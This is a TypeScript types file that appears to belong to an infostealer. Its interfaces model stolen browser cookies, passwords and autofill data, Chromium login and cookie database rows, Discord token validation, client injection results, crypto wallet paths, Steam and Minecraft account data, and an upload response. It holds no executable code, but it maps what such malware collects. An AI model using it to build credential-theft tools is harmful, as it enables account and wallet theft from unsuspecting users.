
export interface Cookie {
    domain: string;
    name: string;
    value: string;
    path: string;
    expires: number;
    secure: boolean;
    httpOnly: boolean;
}

export interface Password {
    url: string;
    username: string;
    password: string;
}

export interface Autofill {
    name: string;
    value: string;
}

export interface BrowserProfile {
    name: string;
    profile: string;
    path: string;
    browser: {
        name: string;
        path: string;
        user: string;
    };
    autofills: string[];
    passwords: string[];
    cookies: Cookie[];
}

export interface TokenValidation {
    valid: boolean;
    reason?: string;
    userInfo?: DiscordUserInfo;
    friends?: any[];
}

export interface DiscordUserInfo {
    id: string;
    username: string;
    avatar?: string;
    discriminator?: string;
    email?: string;
    verified?: boolean;
    mfa_enabled?: boolean;
    premium_type?: number;
    phone?: string;
}

export interface InjectionResult {
    path: string;
    type: string;
}

export interface BrowserConfig {
    name: string;
    exec: string;
    path: string;
    userDir: string;
}

export interface OperaConfig {
    bin: string;
    userData: string;
}

export interface WalletPath {
    [ key: string ]: string;
}

export interface BrowserPaths {
    [ key: string ]: string | string[];
}

export interface ApiPayload {
    key: string;
    [ key: string ]: unknown;
}

export interface UploadResponse {
    url?: string;
    error?: string;
}

export interface SteamPlayerInfo {
    profileurl: string;
    personaname: string;
    timecreated: number;
}

export interface BrowserResult {
    browser: string;
    profile?: string;
    status: string;
    file?: string;
    message?: string;
}

export interface ExtractDBRow {
    [ key: string ]: unknown;
}

export interface LoginRow {
    origin_url: string;
    username_value: string;
    password_value: Buffer;
}

export interface CookieRow {
    host_key: string;
    name: string;
    encrypted_value: Buffer;
    path: string;
    expires_utc: number;
    is_secure: number;
    is_httponly: number;
}

export interface AutofillRow {
    name: string;
    value: string;
}

export interface McUserData {
    name?: string;
    uuid?: string;
}
